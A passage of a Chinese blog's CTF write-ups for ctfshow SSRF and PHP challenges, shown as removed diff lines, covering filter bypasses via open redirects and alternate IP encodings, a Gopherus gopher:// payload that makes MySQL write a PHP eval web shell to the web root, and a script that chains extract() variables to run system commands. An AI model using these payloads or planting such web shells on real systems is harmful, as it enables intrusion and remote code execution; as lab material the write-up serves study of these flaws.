-<span class="token number">4</span>、可以对字符进行<span class="token constant">URL</span>编码以混淆<span class="token constant">URL</span>分析代码。如果实现筛选器的代码与执行后端<span class="token constant">HTTP</span>请求的代码处理<span class="token constant">URL</span>编码的字符的方式不同，则这一点特别有用
-
-<span class="token number">5</span>、可以将这些技术结合使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="通过开放重定向绕过-SSRF-过滤器"><a href="#通过开放重定向绕过-SSRF-过滤器" class="headerlink" title="通过开放重定向绕过 SSRF 过滤器"></a>通过开放重定向绕过 SSRF 过滤器</h3><p>有时可以通过利用开放重定向漏洞来规避任何类型的基于过滤器的防御。</p>
-<p>在前面的 SSRF 示例中，假设用户提交的 URL 被严格验证以防止恶意利用 SSRF 行为。但是，允许使用 URL 的应用程序存在开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，您可以构建一个满足过滤器的 URL，并将请求重定向到所需的后端目标。</p>
-<p>例如，假设应用程序包含一个开放重定向漏洞，其中包含以下 URL：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>返回重定向到：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>可以利用开放重定向漏洞绕过URL过滤，利用SSRF漏洞，方法如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 118 stockApi&#x3D;http:&#x2F;&#x2F;weliketoshop.net&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;192.168.0.68&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>此 SSRF 漏洞利用之所以有效，是因为应用程序首先验证提供的<code>stockAPI</code>URL 是否位于允许的域中，而事实确实如此。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>
-<h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p><strong>352</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span> hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>353</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-url.php"><strong>parse_url</strong> </a></p>
-<blockquote>
-<p>parse_url — 解析 URL，返回其组成部分</p>
-</blockquote>
-<blockquote>
-<p>curl_setopt — 设置一个cURL传输选项</p>
-<p>ch</p>
-<p>由 curl_init() 返回的 cURL 句柄。</p>
-<p>option</p>
-<p>需要设置的CURLOPT_XXX选项。</p>
-<p>value</p>
-<p>将设置在option选项上的值。</p>
-</blockquote>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">//初始化一个cURL会话</span>
-<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//设定请求的RUL</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//设定返回信息中包含响应信息头</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 	启用时会将头文件的信息作为数据流输出。 </span>
-<span class="token comment">//参数为1表示输出信息头,为0表示不输出</span>
-
-
-
-<span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//TRUE 将curl_exec()获取的信息以字符串返回，而不是直接输出。 </span>
-<span class="token comment">//参数为1表示$html,为0表示echo $html</span>
-
-
-
-
-
-<span class="token comment">//执行一个cURL会话</span>
-<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//关闭一个surl会话</span>
-<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span>
-<span class="token comment">//echo $html;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre><code>127.1会被解析成127.0.0.1，也就意味着为零可缺省
-在Linux中，0也会被解析成127.0.0.1
-127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
-ip地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/168e616aefc948da8c4c5279035d9f78.png" alt="1"></p>
-<blockquote>
-<p>十进制整数：url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>十六进制：url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制：url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>十六进制整数：url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 缺省模式：127.0.0.1写成127.1<br>CIDR：url&#x3D;<a target="_blank" rel="noopener" href="http://127.127.127.127/flag.php%E5%92%8C">http://127.127.127.127/flag.php和</a> url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
-</blockquote>
-<h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>使用<strong><a target="_blank" rel="noopener" href="http://sudo.cc/">http://sudo.cc</a></strong>这个域名是指向127.0.0.1的。<br>payload：<code>url=http://sudo.cc/flag.php</code></p>
-<h2 id="355"><a href="#355" class="headerlink" title="355"></a>355</h2><p>payload:<code>url=http://0/flag.php</code></p>
-<h2 id="356"><a href="#356" class="headerlink" title="356"></a>356</h2><p>payload:<code>url=http://0/flag.php</code></p>
-<h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>gethostbyname 函数从主机数据库中检索与主机名对应的主机信息。</p>
-</blockquote>
-<blockquote>
-<p>filter_var() 函数通过指定的过滤器过滤变量。<br>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p>
-</blockquote>
-<blockquote>
-<p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）<br>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p>
-</blockquote>
-<p><strong>RFC1918指定的私有地址有哪些?</strong></p>
-<blockquote>
-<p>A类：10.0.0.0&#x2F;8即10.0.0.0<del>10.255.255.255<br>B类：172.16.0.0&#x2F;12即172.16.0.0</del>172.31.255.255<br>C类：192.168.0.0&#x2F;16即192.168.0.0~192.168.255.255</p>
-</blockquote>
-<h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>正则表达式表明l以ctf.开始以show结束，中间任意</p>
-<pre><code>当parse_url()解析到邮箱时：@前面是user
-file_get_contents()会访问host:port/path，与user无关
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/95d0f8a3ff4c4339b93d58388abd9559.png" alt="1"></p>
-<h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p><strong>打无密码的mysql</strong><br>点击登陆后进入check.php文件。啥也没有，返回主页查看源码。<br><img src="https://img-blog.csdnimg.cn/cb3f6d8d75444bd588df83cb2cc1fa85.png" alt="1">发现了这个，看来一些wp，是要用gopher协议打MYSQL,,这里用到这个工具<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">gopherus</a>。</p>
-<p><img src="https://img-blog.csdnimg.cn/95522062ea2144718161ffab303b9848.png" alt="2"><br>意思就是输入MySQL的用户名，再给出要运行的语句。<br><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></p>
-<blockquote>
-<p>这是一个MySQL查询语句，它会将一个PHP代码片段写入到目录”&#x2F;var&#x2F;www&#x2F;html&#x2F;“下的文件”2.php”中。<br>所写入的PHP代码是”<?php @eval($_POST['cmd']);?>“。这段代码会创建一个PHP脚本，该脚本接受一个名为”cmd”的POST请求参数，然后将”cmd”参数的内容作为PHP代码执行。<br>这段代码可能被攻击者用来在Web服务器上创建一个后门，使得攻击者可以通过发送特制的POST请求来执行任意命令。</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/0b40b99caeea4464bd7f897232c326cf.png" alt="3"><br>**_**后面的url再进行一次url编码。<br>然后进入check.php文件post<br><code>returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</code><br>这时2.php文件已经成功写入，访问2.php文件进行命令执行得到flag。</p>
-<h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p><strong>打redis</strong><br>redis的端口是<strong>6379</strong><br>打redis即可</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -788,256 +366,7 @@ file_get_contents()会访问host:port/path，与user无关
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2022-11-10 17:20:38
-# @Last Modified by:   h1xa
-# @Last Modified time: 2022-11-11 08:21:54
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>假如传入_&#x3D;a，那么就是$<em>&#x3D;a;再传入a&#x3D;b，那就是$$</em>&#x3D;b；</p>
-<h3 id="extract-定义和用法"><a href="#extract-定义和用法" class="headerlink" title="extract()定义和用法"></a>extract()定义和用法</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p>
-<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
-<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
-<p>该函数返回成功导入到符号表中的变量数目。</p>
-<p>所以我们要套娃传入变量，应该传入36个变量再执行命令。<br>脚本：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
-s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters
-t<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>
-code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#要执行的命令</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>
-
-t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code
-<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(‘ls’);</p>
-</blockquote>
-<p>再寻找flag<br>原来在**cd ..&#x2F;..&#x2F;..&#x2F;**下<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p>
-<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong>存在任意文件下载</strong></p>
